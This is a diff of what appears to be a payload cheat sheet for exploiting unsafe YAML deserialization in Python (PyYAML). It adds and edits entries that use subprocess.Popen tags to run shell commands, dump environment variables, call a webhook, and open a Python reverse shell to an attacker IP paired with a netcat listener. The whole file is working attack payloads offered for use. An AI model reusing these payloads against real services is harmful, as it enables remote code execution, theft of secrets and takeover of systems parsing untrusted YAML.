@@ -1,13 +1,16 @@
-### hello world!
-- !!python/object/apply:subprocess.Popen [[echo, hello world!]]
+### hello world
+- test:
+  - 1
+  - 2
+- !!python/object/apply:subprocess.Popen [[echo, Hello World!]]
 
 
 ### environment variables
 - !!python/object/apply:subprocess.Popen [[env]]
 
 
-### hitting a webhook
-- !!python/object/apply:subprocess.Popen [['wget', 'https://webhook.site/TODO/']]
+### webhook (TODO: insert webhook URL)
+- !!python/object/apply:subprocess.Popen [['wget', 'WEBHOOK_URL_HERE']]
 
 
 ### use python
@@ -18,8 +21,8 @@
 # on the attacker machine
 nc -lvnp 10000
 
-# on the webpage (TODO: update IP)
-- !!python/object/apply:subprocess.Popen [['python', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.202",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")']]
+# on the webpage (TODO: insert machine IP)
+  - !!python/object/apply:subprocess.Popen [['python', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.216.189.110",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")']]
 
 
 
